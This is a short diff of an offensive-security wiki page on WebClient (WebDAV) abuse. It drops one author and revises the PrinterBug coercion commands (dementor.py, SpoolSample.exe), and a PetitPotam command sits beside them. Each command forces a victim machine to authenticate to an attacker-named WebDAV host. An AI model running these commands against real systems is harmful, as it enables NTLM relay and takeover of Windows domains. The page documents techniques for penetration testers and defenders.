@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo, mpgn, sckdev, Pri3st, rtpt-romankarwacik
+authors: ShutdownRepo, mpgn, sckdev, Pri3st
 ---
 
 # WebClient abuse (WebDAV)
@@ -56,8 +56,8 @@ Below are a few examples of WebClient abuse with [PrinterBug](../print-spooler-s
 
 ```bash
 # PrinterBug
-dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/print" "VICTIM_IP"
-SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS_NAME@PORT/print"
+dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
+SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
 
 # PetitPotam
 Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
